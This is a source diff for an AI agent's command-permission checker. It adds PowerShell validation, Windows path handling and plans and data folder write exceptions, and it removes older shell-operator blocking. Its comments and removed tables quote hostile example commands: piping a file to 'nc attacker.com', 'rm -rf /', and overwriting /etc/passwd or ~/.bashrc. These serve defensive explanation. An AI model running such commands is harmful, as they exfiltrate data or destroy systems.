@@ -13,8 +13,8 @@
 /// <reference path="../types/incr-regex-package.d.ts" />
 
 import { homedir } from 'os';
-import { parse as parseShellCommand, type ParseEntry } from 'shell-quote';
 import { debug } from '../utils/debug.ts';
+import { resolve } from 'path';
 import type { PermissionsContext, MergedPermissionsConfig } from './permissions-config.ts';
 import {
   validateBashCommand,
@@ -22,6 +22,14 @@ import {
   type BashValidationResult,
   type BashValidationReason,
 } from './bash-validator.ts';
+import {
+  validatePowerShellCommand,
+  looksLikePowerShell,
+  isPowerShellAvailable,
+  extractPowerShellWriteTarget,
+  type PowerShellValidationResult,
+  type PowerShellValidationReason,
+} from './powershell-validator.ts';
 import {
   type PermissionMode,
   type ModeConfig,
@@ -47,6 +55,14 @@ export {
   PERMISSION_MODE_ORDER,
   PERMISSION_MODE_CONFIG,
   SAFE_MODE_CONFIG,
+};
+
+// Re-export PowerShell validator types
+export {
+  type PowerShellValidationResult,
+  type PowerShellValidationReason,
+  looksLikePowerShell,
+  isPowerShellAvailable,
 };
 
 /**
@@ -83,24 +99,10 @@ function expandHome(path: string): string {
 }
 
 /**
- * Cache for compiled glob-to-regex patterns.
- * Prevents repeated regex compilation for the same patterns.
- * Uses LRU-like eviction when cache exceeds max size.
- */
-const globRegexCache = new Map<string, RegExp>();
-const GLOB_CACHE_MAX_SIZE = 500; // Max cached patterns
-
-/**
- * Convert a simple glob pattern to a regex (with caching)
+ * Convert a simple glob pattern to a regex
  * Supports: ** (recursive), * (single segment), ? (single char)
  */
 function globToRegex(pattern: string): RegExp {
-  // Check cache first
-  const cached = globRegexCache.get(pattern);
-  if (cached) {
-    return cached;
-  }
-
   // Expand ~ in pattern
   const expandedPattern = expandHome(pattern);
 
@@ -112,25 +114,15 @@ function globToRegex(pattern: string): RegExp {
     .replace(/\0DOUBLE_STAR\0/g, '.*')      // ** matches anything including /
     .replace(/\?/g, '.');                   // ? matches single char
 
-  const compiled = new RegExp(`^${regex}$`);
-
-  // Cache the compiled regex (with LRU-like eviction)
-  if (globRegexCache.size >= GLOB_CACHE_MAX_SIZE) {
-    // Remove oldest entry (first key in Map maintains insertion order)
-    const firstKey = globRegexCache.keys().next().value;
-    if (firstKey) globRegexCache.delete(firstKey);
-  }
-  globRegexCache.set(pattern, compiled);
-
-  return compiled;
+  return new RegExp(`^${regex}$`);
 }
 
 /**
  * Check if a path matches any of the allowed write path patterns
  */
 function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): boolean {
-  // Normalize path (expand ~ and use forward slashes)
-  const normalizedPath = expandHome(filePath).replace(/\\/g, '/');
+  // Normalize path (expand ~, resolve, and use forward slashes)
+  const normalizedPath = normalizeForComparison(expandHome(filePath));
 
   for (const pattern of allowedPaths) {
     try {
@@ -144,6 +136,17 @@ function matchesAllowedWritePath(filePath: string, allowedPaths: string[]): bool
     }
   }
   return false;
+}
+
+/**
+ * Normalize a path for cross-platform comparison.
+ * - Resolve to absolute path
+ * - Convert backslashes to forward slashes
+ * - Lowercase on Windows for case-insensitive comparison
+ */
+function normalizeForComparison(path: string): string {
+  const normalized = resolve(path).replace(/\\/g, '/');
+  return process.platform === 'win32' ? normalized.toLowerCase() : normalized;
 }
 
 // ============================================================
@@ -342,102 +345,20 @@ export function cleanupModeState(sessionId: string): void {
  */
 type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;
 
-// ============================================================
-// Command Chaining Detection (Security)
-// ============================================================
-
 /**
- * Operators that chain multiple commands together.
- * These are dangerous because they allow executing arbitrary commands
- * after a "safe" prefix like: `ls && rm -rf /`
- */
-export const DANGEROUS_CHAIN_OPERATORS = new Set([
-  '&&',   // AND - second command runs if first succeeds
-  '||',   // OR - second command runs if first fails
-  ';',    // Sequence - always runs second command
-  '|',    // Pipe - connects stdout to stdin (can chain to dangerous commands)
-  '&',    // Background - runs command in background
-  '|&',   // Pipe stderr - bash extension
-]);
-
-/**
- * Operators that write to files.
- * These are dangerous because they can overwrite/modify files.
- */
-export const DANGEROUS_REDIRECT_OPERATORS = new Set([
-  '>',    // Overwrite file
-  '>>',   // Append to file
-  '>&',   // Redirect stderr to file
-]);
-
-/**
- * Extract the operator string from a shell-quote operator token.
- * shell-quote returns operators as objects with an `op` property.
- * Returns undefined if not an operator.
- */
-function getOperator(token: ParseEntry): string | undefined {
-  if (typeof token === 'object' && token !== null && 'op' in token) {
-    return token.op;
-  }
-  return undefined;
-}
-
-/**
- * Check if a command contains dangerous shell operators (command chaining or redirects).
+ * Dangerous control characters that could cause issues at lower levels.
  *
- * This prevents attacks like:
- * - `ls && rm -rf /` (command chaining)
- * - `cat file | nc attacker.com 1234` (piping to network)
- * - `echo "data" > /etc/passwd` (file overwrite)
- *
- * Uses shell-quote to properly parse the command, handling edge cases like:
- * - Quoted strings: `ls "&&"` is safe (the && is a literal string)
- * - Escaped chars: `ls \&\&` is safe (escaped)
- *
- * @param command - The bash command to check
- * @returns true if command contains dangerous operators, false if safe
- */
-export function hasDangerousShellOperators(command: string): boolean {
-  try {
-    const parsed = parseShellCommand(command);
-
-    for (const token of parsed) {
-      const op = getOperator(token);
-      if (op) {
-        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
-          debug(`[Mode] Dangerous chain operator detected: "${op}" in command: ${command}`);
-          return true;
-        }
-        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
-          debug(`[Mode] Dangerous redirect operator detected: "${op}" in command: ${command}`);
-          return true;
-        }
-      }
-    }
-
-    return false;
-  } catch (error) {
-    // Parse error - assume dangerous (fail closed)
-    debug(`[Mode] Shell parse error for command "${command}":`, error);
-    return true;
-  }
-}
-
-/**
- * Control characters that act as command separators or could be used for injection.
- * These are dangerous because they can terminate the "safe" command and start a new one.
+ * Note: Newlines and carriage returns are NOT blocked because bash-parser
+ * correctly handles them as command separators, and the AST validation
+ * checks each command individually. Only null bytes are blocked as they
+ * could cause issues with C bindings and string handling.
  */
 const DANGEROUS_CONTROL_CHARS = new Set([
-  '\n',    // Newline - acts as command separator in bash
-  '\r',    // Carriage return - can act as newline
   '\x00',  // Null byte - can truncate strings in some contexts
 ]);
 
 /**
  * Check if a command contains dangerous control characters.
- *
- * Newlines and carriage returns act as command separators in bash:
- * - `ls\nrm -rf /` executes both ls and rm
  *
  * @param command - The bash command to check
  * @returns true if command contains dangerous control chars, false if safe
@@ -550,24 +471,6 @@ export type BashRejectionReason =
   | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };
 
 /**
- * Human-readable explanations for dangerous operators.
- * These help the agent understand why specific operators are blocked.
- */
-const OPERATOR_EXPLANATIONS: Record<string, string> = {
-  // Chain operators
-  '&&': 'runs second command if first succeeds (e.g., `safe && dangerous`)',
-  '||': 'runs second command if first fails (e.g., `safe || dangerous`)',
-  ';': 'always runs second command regardless of first (e.g., `safe; dangerous`)',
-  '|': 'pipes output to another command which could be dangerous (e.g., `cat file | nc attacker.com`)',
-  '&': 'runs command in background, allowing additional commands',
-  '|&': 'pipes both stdout and stderr to another command',
-  // Redirect operators
-  '>': 'overwrites file contents (e.g., `echo data > /etc/passwd`)',
-  '>>': 'appends to file (e.g., `echo data >> ~/.bashrc`)',
-  '>&': 'redirects stderr to a file',
-};
-
-/**
  * Human-readable explanations for control characters.
  */
 const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
@@ -590,40 +493,6 @@ function findDangerousControlChar(command: string): { char: string; charCode: nu
     }
   }
   return null;
-}
-
-/**
- * Find the first dangerous shell operator in a command.
- * Returns details about the operator if found, null otherwise.
- */
-function findDangerousOperator(command: string): { operator: string; operatorType: 'chain' | 'redirect'; explanation: string } | null {
-  try {
-    const parsed = parseShellCommand(command);
-
-    for (const token of parsed) {
-      const op = getOperator(token);
-      if (op) {
-        if (DANGEROUS_CHAIN_OPERATORS.has(op)) {
-          return {
-            operator: op,
-            operatorType: 'chain',
-            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows command chaining',
-          };
-        }
-        if (DANGEROUS_REDIRECT_OPERATORS.has(op)) {
-          return {
-            operator: op,
-            operatorType: 'redirect',
-            explanation: OPERATOR_EXPLANATIONS[op] ?? 'allows file redirection',
-          };
-        }
-      }
-    }
-    return null;
-  } catch {
-    // Parse error handled separately
-    return null;
-  }
 }
 
 /**
@@ -837,7 +706,7 @@ function generateMismatchSuggestion(
     }
 
     return `The pattern expects a subcommand after \`${firstWord}\`, but found flag \`${failedToken}\`. ` +
-      `Run from the target directory or switch to Ask/Auto mode.`;
+      `Run from the target directory or switch to Ask/Execute mode.`;
   }
 
   // Detect possible typos in subcommands using simple heuristics
@@ -869,6 +738,120 @@ function generateMismatchSuggestion(
   return undefined;
 }
 
+// ============================================================
+// Windows Path Helpers (for bash-parser fallback)
+// ============================================================
+
+/**
+ * Check if a command looks like a Windows CMD builtin that can't be parsed
+ * by bash-parser or normalized via path rewriting.
+ */
+function looksLikeCmdBuiltin(command: string): boolean {
+  // Match CMD builtins at the start of the command (case-insensitive).
+  // Note: `type` is excluded because it's also a valid bash builtin (check command type).
+  // Note: `mkdir` is excluded because it's also a valid Unix/bash command.
+  return /^(?:if\s+(?:not\s+)?exist|for\s+\/[a-z]|set\s+\w+=|copy\s|move\s|ren(?:ame)?\s|del\s|erase\s|rd\s|rmdir\s|md\s|assoc\s|ftype\s)\b/i.test(command);
+}
+
+/**
+ * Normalize Windows backslash paths in a command string so that bash-parser
+ * (a POSIX parser) can handle them without treating \ as escape characters.
+ *
+ * Converts backslashes to forward slashes inside:
+ * - Double-quoted strings: "C:\Users\..." → "C:/Users/..."
+ * - Single-quoted strings: passed through (bash-parser treats them as literal anyway)
+ * - Unquoted tokens that look like Windows paths: C:\Users\... → C:/Users/...
+ *
+ * Preserves actual bash escape sequences (\n, \t, \\, \", etc.) inside
+ * double-quoted strings by only converting backslashes that precede
+ * characters that are NOT standard bash escape targets.
+ */
+export function normalizeWindowsPathsForBashParser(command: string): string {
+  let result = '';
+  let i = 0;
+
+  while (i < command.length) {
+    const ch = command[i];
+
+    if (ch === "'") {
+      // Single-quoted string: copy verbatim (bash treats contents literally)
+      const end = command.indexOf("'", i + 1);
+      if (end === -1) {
+        // Unclosed single quote - copy rest as-is
+        result += command.slice(i);
+        break;
+      }
+      result += command.slice(i, end + 1);
+      i = end + 1;
+    } else if (ch === '"') {
+      // Double-quoted string: fix the critical \" issue for Windows paths.
+      //
+      // In bash, \X inside double quotes is only special for 5 chars: \ " $ ` !
+      // For all other chars, bash-parser keeps the literal \X (no stripping).
+      // So the ONLY problem case is \" which bash-parser treats as an escaped
+      // quote instead of "backslash + closing-quote". This happens when a
+      // Windows path ends with \ right before the closing ":
+      //   ls "C:\path\"  →  bash-parser sees \" as escaped quote, string never closes
+      //
+      // Fix: convert \\ to // (prevents double-backslash from eating a path sep)
+      // and convert \" to /" (prevents the unclosed-quote parse failure).
+      // Leave all other \X alone since bash-parser handles them correctly.
+      result += '"';
+      i++;
+      while (i < command.length && command[i] !== '"') {
+        if (command[i] === '\\' && i + 1 < command.length) {
+          const next = command[i + 1];
+          if (next === '"') {
+            // \\" → /" — this is the critical fix for the "Unclosed quote" bug.
+            // Convert the backslash to / so bash-parser sees the closing quote.
+            result += '/';
+            // Don't consume the quote - let the outer loop see it as closing
+            i++;
+          } else if (next === '\\') {
+            // \\\\ → // — convert double-backslash to double-forward-slash
+            result += '//';
+            i += 2;
+          } else {
+            // All other \X — pass through literally (bash-parser keeps them as-is)
+            result += command[i]! + next!;
+            i += 2;
+          }
+        } else {
+          result += command[i]!;
+          i++;
+        }
+      }
+      if (i < command.length) {
+        result += '"'; // closing quote
+        i++;
+      }
+    } else {
+      // Unquoted context: detect Windows-style path tokens and convert
+      // A Windows path looks like X:\ at the start of a "word"
+      if (
+        /[A-Za-z]/.test(ch!) &&
+        i + 2 < command.length &&
+        command[i + 1]! === ':' &&
+        command[i + 2]! === '\\'
+      ) {
+        // Consume the path token (up to whitespace or special shell chars)
+        let pathEnd = i;
+        while (pathEnd < command.length && !/[\s|&;()<>]/.test(command[pathEnd]!)) {
+          pathEnd++;
+        }
+        const pathToken = command.slice(i, pathEnd).replace(/\\/g, '/');
+        result += pathToken;
+        i = pathEnd;
+      } else {
+        result += ch;
+        i++;
+      }
+    }
+  }
+
+  return result;
+}
+
 /**
  * Get detailed reason why a bash command would be rejected.
  * Returns null if the command is safe, otherwise returns the specific reason.
@@ -876,6 +859,9 @@ function generateMismatchSuggestion(
  * Uses AST-based validation for compound commands (&&, ||, ;) to allow
  * safe compound commands like `git status && git log` while still blocking
  * dangerous constructs.
+ *
+ * For PowerShell commands (detected by syntax or on Windows), uses the
+ * PowerShell validator with native System.Management.Automation parsing.
  *
  * This is used to provide helpful error messages that explain exactly what
  * was blocked and why, helping the agent understand and avoid the issue.
@@ -895,9 +881,39 @@ export function getBashRejectionReason(command: string, config: ToolCheckConfig)
     };
   }
 
-  // Step 2: Use AST-based validation
+  // Step 2: Determine if this is a PowerShell command
+  // Use PS validator only for commands that look like PowerShell syntax.
+  // On Windows, non-PowerShell commands (e.g. `git status && git log`) are
+  // validated via bash-parser with Windows path normalization instead, because
+  // the PS parser has different semantics for redirects, subshells, $(), etc.
+  const isWindows = process.platform === 'win32';
+  const isPsCommand = looksLikePowerShell(trimmedCommand);
+
+  if (isPsCommand && isPowerShellAvailable()) {
+    debug('[Mode] Using PowerShell validator for command:', trimmedCommand);
+    return getPowerShellRejectionReason(trimmedCommand, config);
+  }
+
+  // Step 2b: On Windows, reject CMD-only syntax early.
+  // Commands like `if not exist`, `for /f`, `set VAR=` are Windows CMD builtins
+  // that neither bash-parser nor path normalization can handle.
+  if (isWindows && looksLikeCmdBuiltin(trimmedCommand)) {
+    return {
+      type: 'parse_error',
+      error: 'Windows CMD syntax (if/for/set/copy/move) is not supported in Explore mode. Use PowerShell equivalents or bash commands instead.',
+    };
+  }
+
+  // Step 2c: On Windows, normalize backslash paths for bash-parser.
+  // bash-parser is POSIX and treats \ as escape chars, mangling Windows paths like
+  // C:\Users\... into C:Users... or failing on trailing backslash-quote (\").
+  const commandForParser = isWindows
+    ? normalizeWindowsPathsForBashParser(trimmedCommand)
+    : trimmedCommand;
+
+  // Step 3: Use bash AST-based validation
   // This handles compound commands, pipelines, redirects, and substitutions properly
-  const astResult = validateBashCommand(trimmedCommand, config.readOnlyBashPatterns);
+  const astResult = validateBashCommand(commandForParser, config.readOnlyBashPatterns);
 
   if (astResult.allowed) {
     debug('[Mode] Command allowed via AST validation:', trimmedCommand);
@@ -980,6 +996,116 @@ export function getBashRejectionReason(command: string, config: ToolCheckConfig)
   return {
     type: 'no_safe_pattern',
     command: trimmedCommand,
+    relevantPatterns: [],
+    mismatchAnalysis: undefined,
+  };
+}
+
+/**
+ * Get detailed reason why a PowerShell command would be rejected.
+ * Converts PowerShell validation results to BashRejectionReason format
+ * for consistent error message handling.
+ */
+function getPowerShellRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
+  const psResult = validatePowerShellCommand(command, config.readOnlyBashPatterns);
+
+  if (psResult.allowed) {
+    debug('[Mode] PowerShell command allowed via AST validation:', command);
+    return null;
+  }
+
+  // Convert PowerShell rejection reason to BashRejectionReason format
+  if (psResult.reason) {
+    const reason = psResult.reason;
+
+    switch (reason.type) {
+      case 'parse_error':
+        return { type: 'parse_error', error: reason.error };
+
+      case 'powershell_unavailable':
+        // Fall back to bash validation if PowerShell is not available
+        debug('[Mode] PowerShell unavailable, falling back to bash validation');
+        return null;
+
+      case 'pipeline':
+        return {
+          type: 'dangerous_operator',
+          operator: '|',
+          operatorType: 'chain',
+          explanation: reason.explanation,
+        };
+
+      case 'redirect':
+        return {
+          type: 'dangerous_operator',
+          operator: '>',
+          operatorType: 'redirect',
+          explanation: reason.explanation,
+        };
+
+      case 'subexpression':
+        return {
+          type: 'dangerous_substitution',
+          pattern: '$()',
+          explanation: reason.explanation,
+        };
+
+      case 'script_block':
+        return {
+          type: 'dangerous_substitution',
+          pattern: '{ }',
+          explanation: reason.explanation,
+        };
+
+      case 'invoke_expression':
+        return {
+          type: 'dangerous_substitution',
+          pattern: 'Invoke-Expression',
+          explanation: reason.explanation,
+        };
+
+      case 'dot_sourcing':
+        return {
+          type: 'dangerous_substitution',
+          pattern: '. (dot-sourcing)',
+          explanation: reason.explanation,
+        };
+
+      case 'assignment':
+        return {
+          type: 'dangerous_operator',
+          operator: '=',
+          operatorType: 'chain',
+          explanation: reason.explanation,
+        };
+
+      case 'background_execution':
+        return {
+          type: 'dangerous_operator',
+          operator: '&',
+          operatorType: 'chain',
+          explanation: reason.explanation,
+        };
+
+      case 'unsafe_command': {
+        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
+        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
+
+        return {
+          type: 'no_safe_pattern',
+          command: reason.command,
+          relevantPatterns,
+          mismatchAnalysis: mismatchAnalysis ?? undefined,
+        };
+      }
+    }
+  }
+
+  // Fallback
+  debug('[Mode] Unexpected: PowerShell AST rejected but no reason provided');
+  return {
+    type: 'no_safe_pattern',
+    command: command,
     relevantPatterns: [],
     mismatchAnalysis: undefined,
   };
@@ -1139,15 +1265,19 @@ export function formatBashRejectionMessage(reason: BashRejectionReason, config: 
  *
  * A command is considered safe if:
  * 1. It does NOT contain dangerous control characters (newlines, etc.)
- * 2. All simple commands match read-only patterns
- * 3. It does NOT contain pipelines (|) - these transform data between commands
- * 4. It does NOT contain redirects (>, >>, <) - these modify files
- * 5. It does NOT contain command/process substitution ($(), ``, <(), >())
+ * 2. All simple commands match read-only patterns (including in compound commands)
+ * 3. It does NOT contain redirects (>, >>, <) - these modify files
+ * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
+ * 5. It does NOT run in background (&)
+ *
+ * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
+ * - `git status && git log` is allowed (both commands are safe)
+ * - `git log | head` is allowed (both commands are safe)
  *
  * This multi-step check prevents attacks like:
  * - `ls\nrm -rf /` (newline injection)
- * - `git status && rm -rf /` (dangerous command in chain)
- * - `cat file | nc attacker.com` (pipeline to dangerous command)
+ * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
+ * - `cat file | nc attacker.com` (nc not in allowlist)
  * - `ls $(rm -rf /)` (command substitution)
  */
 /**
@@ -1174,6 +1304,125 @@ export function isReadOnlyBashCommandWithConfig(command: string, config: ToolChe
  */
 export function isReadOnlyBashCommand(command: string): boolean {
   return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
+}
+
+/**
+ * Extract the write target path from a bash command.
+ * Returns the file path if the command writes to a file via redirect, null otherwise.
+ *
+ * Handles:
+ * - Direct redirects: `echo "x" > /path/file`
+ * - Codex subshell pattern: `/bin/zsh -lc "cat <<'EOF' > /path/file\n...\nEOF"`
+ * - sh/bash -c variants: `bash -c "echo x > /path/file"`
+ * - PowerShell Out-File: `@(...) | Out-File -FilePath 'path'`
+ * - PowerShell Set-Content/Add-Content: `'...' | Set-Content -Path 'path'`
+ */
+export function extractBashWriteTarget(command: string): string | null {
+  // Pattern 1: Quoted path after redirect (handles Codex's escaped quotes)
+  // Matches: > "/path/to/file" or > \"/path/to/file\"
+  const quotedPathMatch = command.match(/>\s*\\?"([^"]+)"/);
+  if (quotedPathMatch?.[1] && quotedPathMatch[1] !== '/dev/null') {
+    return quotedPathMatch[1];
+  }
+
+  // Pattern 2: shell -c/-lc with inner redirect (Codex pattern, unquoted paths)
+  // Match: /bin/zsh -lc "... > /path/to/file ..." or bash -c '... > /path ...'
+  const shellExecMatch = command.match(
+    /(?:\/bin\/)?(?:zsh|bash|sh)\s+(?:-\w+\s+)*["'].*?>\s*([^\s'"\\]+)/
+  );
+  if (shellExecMatch?.[1] && shellExecMatch[1] !== '/dev/null') {
+    return shellExecMatch[1];
+  }
+
+  // Pattern 3: Direct redirect - extract path after > or >>
+  const directRedirectMatch = command.match(/>{1,2}\s*([^\s;|&"'>]+)/);
+  if (directRedirectMatch?.[1] && directRedirectMatch[1] !== '/dev/null') {
+    return directRedirectMatch[1];
+  }
+
+  // Pattern 4: PowerShell Out-File with -FilePath or -Path parameter
+  // Matches: | Out-File -FilePath 'path' or | Out-File -Path "path"
+  const outFileParamMatch = command.match(/Out-File\s+-(?:File)?Path\s+['"]([^'"]+)['"]/i);
+  if (outFileParamMatch?.[1]) {
+    return outFileParamMatch[1];
+  }
+
+  // Pattern 5: PowerShell Out-File with positional path (no -FilePath flag)
+  // Matches: | Out-File 'path' or | Out-File "path"
+  // Must not match -FilePath or -Encoding etc.
+  const outFilePosMatch = command.match(/Out-File\s+['"]([^'"]+)['"]/i);
+  if (outFilePosMatch?.[1] && !command.match(/Out-File\s+-\w/i)) {
+    return outFilePosMatch[1];
+  }
+
+  // Pattern 6: PowerShell Set-Content or Add-Content with -Path parameter
+  // Matches: | Set-Content -Path 'path' or | Add-Content -Path "path"
+  const setContentMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+['"]([^'"]+)['"]/i);
+  if (setContentMatch?.[1]) {
+    return setContentMatch[1];
+  }
+
+  // Pattern 7: PowerShell Set-Content/Add-Content with escaped quotes (inside powershell.exe -Command "...")
+  // When Codex wraps PS commands: powershell.exe -Command "Set-Content -Path \"C:\path\file\" -Value ..."
+  // The -Path value uses escaped quotes \" which don't match Pattern 6's ['"] anchors.
+  // This is a REQUIRED fallback: in the Codex agent context, PowerShell AST parsing
+  // may be unavailable (isPowerShellAvailable() returns false), so extractPowerShellWriteTarget()
+  // returns null and this regex is the only path extraction mechanism.
+  const setContentEscapedMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+\\"([^"]+)\\"/i);
+  if (setContentEscapedMatch?.[1]) {
+    return setContentEscapedMatch[1];
+  }
+
+  // Pattern 8: PowerShell Out-File with escaped quotes (same wrapper scenario)
+  const outFileEscapedMatch = command.match(/Out-File\s+-(?:File)?Path\s+\\"([^"]+)\\"/i);
+  if (outFileEscapedMatch?.[1]) {
+    return outFileEscapedMatch[1];
+  }
+
+  return null;
+}
+
+/**
+ * Check if a command looks like it might be trying to write files.
+ * Used to provide better error messages when write detection fails.
+ */
+export function looksLikePotentialWrite(command: string): boolean {
+  return /Out-File|Set-Content|Add-Content|>\s*[^&]|>>/i.test(command);
+}
+
+/**
+ * Get a helpful hint based on comparing target path to plans folder path.
+ * Detects common mistakes and provides actionable guidance.
+ */
+export function getPathHint(targetPath: string, plansFolderPath: string, dataFolderPath?: string): string | null {
+  const normalizedTarget = targetPath.replace(/\\/g, '/').toLowerCase();
+  const normalizedPlans = plansFolderPath.replace(/\\/g, '/').toLowerCase();
+
+  // Case: Writing to session folder but missing /plans/ or /data/
+  if (normalizedTarget.includes('/sessions/') && !normalizedTarget.includes('/plans/') && !normalizedTarget.includes('/data/')) {
+    return 'Hint: Write to the /plans/ or /data/ subfolder, not the session folder directly.';
+  }
+
+  // Case: Wrong session ID (use lowercase for comparison)
+  const targetSessionMatch = normalizedTarget.match(/sessions\/([^/]+)/);
+  const plansSessionMatch = normalizedPlans.match(/sessions\/([^/]+)/);
+  if (targetSessionMatch && plansSessionMatch && targetSessionMatch[1] !== plansSessionMatch[1]) {
+    // Get the original casing from plansFolderPath for display
+    const originalSessionMatch = plansFolderPath.replace(/\\/g, '/').match(/sessions\/([^/]+)/);
+    return `Hint: Wrong session ID. Current session is "${originalSessionMatch?.[1] ?? plansSessionMatch[1]}".`;
+  }
+
+  // Case: Writing to workspace root instead of session
+  if (normalizedTarget.includes('/.cowork/workspaces/') && !normalizedTarget.includes('/sessions/')) {
+    return 'Hint: Write to the session plans or data folder, not the workspace root.';
+  }
+
+  // Case: Writing outside .cowork entirely
+  if (!normalizedTarget.includes('/.cowork/')) {
+    return 'Hint: Files must be written to the session plans or data folder. Use plansFolderPath or dataFolderPath from <session_state>.';
+  }
+
+  return null;
 }
 
 /**
@@ -1267,6 +1516,7 @@ export function shouldAllowToolInMode(
   mode: PermissionMode,
   options?: {
     plansFolderPath?: string;
+    dataFolderPath?: string;
     permissionsContext?: PermissionsContext;
   }
 ): ToolCheckResult {
@@ -1316,6 +1566,85 @@ export function shouldAllowToolInMode(
         // Command is safe - no rejection reason means it passed all checks
         return { allowed: true };
       }
+
+      // Plans/data folder exception for bash/PowerShell writes.
+      // Bash uses redirects: /bin/zsh -lc "cat <<'EOF' > /path/to/plans/file.md..."
+      // PowerShell uses: @(...) | Out-File -FilePath 'C:\path\to\plans\file.md'
+      // Allow these if the write target is within the plans or data folder.
+      if (options?.plansFolderPath || options?.dataFolderPath) {
+        const targetPath = extractBashWriteTarget(command) ?? extractPowerShellWriteTarget(command);
+        if (targetPath) {
+          // Normalize path separators: replace backslashes with forward slashes, then collapse
+          // consecutive slashes. Codex JSON-RPC may send paths with \\\\ (double backslash)
+          // which becomes \\ in the actual string — each \\ → // → collapsed to /.
+          const normalizedTarget = targetPath.replace(/[\\/]+/g, '/');
+
+          // Check plans folder
+          if (options?.plansFolderPath) {
+            const normalizedPlansDir = options.plansFolderPath.replace(/[\\/]+/g, '/');
+            // Use case-insensitive comparison for Windows path compatibility
+            if (normalizedTarget.toLowerCase().startsWith(normalizedPlansDir.toLowerCase())) {
+              debug(`[Mode] Allowing write to plans folder: ${targetPath}`);
+              return { allowed: true };
+            }
+          }
+
+          // Check data folder
+          if (options?.dataFolderPath) {
+            const normalizedDataDir = options.dataFolderPath.replace(/[\\/]+/g, '/');
+            if (normalizedTarget.toLowerCase().startsWith(normalizedDataDir.toLowerCase())) {
+              debug(`[Mode] Allowing write to data folder: ${targetPath}`);
+              return { allowed: true };
+            }
+          }
+
+          // Target path extracted but not in any allowed folder - give specific error with helpful hint
+          debug(`[Mode] Write target "${targetPath}" is not in plans or data folder`);
+          const pathHint = options?.plansFolderPath ? getPathHint(targetPath, options.plansFolderPath, options?.dataFolderPath) : null;
+          const lines = [
+            `Write blocked (Explore mode) - target not in allowed folders:`,
+            ``,
+            `  Target: ${targetPath}`,
+          ];
+          if (options?.plansFolderPath) {
+            lines.push(`  Plans:  ${options.plansFolderPath}`);
+          }
+          if (options?.dataFolderPath) {
+            lines.push(`  Data:   ${options.dataFolderPath}`);
+          }
+          if (pathHint) {
+            lines.push(``, pathHint);
+          }
+          const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
+          const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
+          lines.push(
+            ``,
+            `Allowed paths in Explore mode:`,
+            ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
+            `• Or ask the user to switch to Ask or Auto mode (${config.shortcutHint}) to enable writes anywhere`
+          );
+          return {
+            allowed: false,
+            reason: lines.join('\n'),
+          };
+        }
+        // Check if this looks like a write attempt but we couldn't extract the path
+        if (looksLikePotentialWrite(command)) {
+          debug(`[Mode] Bash command looks like a write but path extraction failed`);
+          const plansExample = options?.plansFolderPath
+            ? `  Plans: printf '...' > "${options.plansFolderPath}/plan_<descriptive-name>.md"\n` : '';
+          const dataExample = options?.dataFolderPath
+            ? `  Data:  printf '...' > "${options.dataFolderPath}/output.json"\n` : '';
+          return {
+            allowed: false,
+            reason: `Bash command appears to write files but the target path couldn't be detected.\n\n` +
+                    `If writing to an allowed folder, use one of these patterns:\n` +
+                    plansExample + dataExample + `\n` +
+                    `Or ask the user to switch to Ask or Auto mode (${config.shortcutHint}).`,
+          };
+        }
+      }
+
       // Return detailed error message explaining exactly why the command was blocked
       return {
         allowed: false,
@@ -1335,14 +1664,26 @@ export function shouldAllowToolInMode(
     const filePath = (input?.file_path ?? input?.notebook_path) as string | undefined;
 
     if (filePath) {
+      const normalizedPath = filePath.replace(/\\/g, '/');
+
       // Check plans folder exception
       if (options?.plansFolderPath) {
-        const normalizedPath = filePath.replace(/\\/g, '/');
         const normalizedPlansDir = options.plansFolderPath.replace(/\\/g, '/');
         debug(`[Mode] Checking plans folder exception: path="${normalizedPath}", plansDir="${normalizedPlansDir}"`);
 
-        if (normalizedPath.startsWith(normalizedPlansDir)) {
+        // Use case-insensitive comparison for Windows path compatibility
+        // (paths from Codex may have inconsistent casing)
+        if (normalizedPath.toLowerCase().startsWith(normalizedPlansDir.toLowerCase())) {
           debug(`[Mode] Allowing ${toolName} to plans folder`);
+          return { allowed: true };
+        }
+      }
+
+      // Check data folder exception
+      if (options?.dataFolderPath) {
+        const normalizedDataDir = options.dataFolderPath.replace(/\\/g, '/');
+        if (normalizedPath.toLowerCase().startsWith(normalizedDataDir.toLowerCase())) {
+          debug(`[Mode] Allowing ${toolName} to data folder`);
           return { allowed: true };
         }
       }
@@ -1353,6 +1694,38 @@ export function shouldAllowToolInMode(
           debug(`[Mode] Allowing ${toolName} via allowedWritePaths`);
           return { allowed: true };
         }
+      }
+
+      // Not in plans/data folder and not in allowedWritePaths - provide detailed rejection
+      if (options?.plansFolderPath || options?.dataFolderPath) {
+        debug(`[Mode] ${toolName} target "${filePath}" not in allowed folders or allowedWritePaths`);
+        const pathHint = options?.plansFolderPath ? getPathHint(filePath, options.plansFolderPath, options?.dataFolderPath) : null;
+        const lines = [
+          `${toolName} blocked (Explore mode) - target not in allowed folders:`,
+          ``,
+          `  Target: ${filePath}`,
+        ];
+        if (options?.plansFolderPath) {
+          lines.push(`  Plans:  ${options.plansFolderPath}`);
+        }
+        if (options?.dataFolderPath) {
+          lines.push(`  Data:   ${options.dataFolderPath}`);
+        }
+        if (pathHint) {
+          lines.push(``, pathHint);
+        }
+        const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
+        const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
+        lines.push(
+          ``,
+          `Allowed paths in Explore mode:`,
